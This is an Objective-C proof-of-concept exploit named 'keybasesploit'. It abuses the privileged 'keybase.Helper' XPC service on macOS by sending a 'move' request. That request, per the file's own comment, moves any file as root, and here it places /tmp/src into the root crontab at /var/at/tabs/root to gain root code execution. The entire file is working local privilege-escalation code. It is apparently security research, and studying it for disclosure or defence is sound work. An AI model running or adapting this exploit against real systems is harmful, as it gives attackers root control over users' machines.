//
//  main.m
//  keybasesploit
//
//  Created by Niklas B. on 12/19/18.
//  Copyright © 2018 niklasb. All rights reserved.
//

#import <Foundation/Foundation.h>
#import <MPMessagePack/MPMessagePack.h>
#import <stdio.h>

int main(int argc, const char * argv[]) {
    int slp = atoi(argv[1]);
    if (slp == 0) {
        printf("sploit running\n");
    }
    NSError *error;
    MPXPCClient *client = [[MPXPCClient alloc] initWithServiceName:@"keybase.Helper" privileged:true];
    [client connect:&error];
    
    // Moves any file from "source" to "destination" as the root user
    [client sendRequest:@"move" params:@[@{@"source":@"/tmp/src", @"destination":@"/var/at/tabs/root"}] completion: ^(NSError *error, id value) {
        NSLog(@"WORKS");
    }];
    if (slp > 0)
        usleep(slp);
    else
        getchar();
}
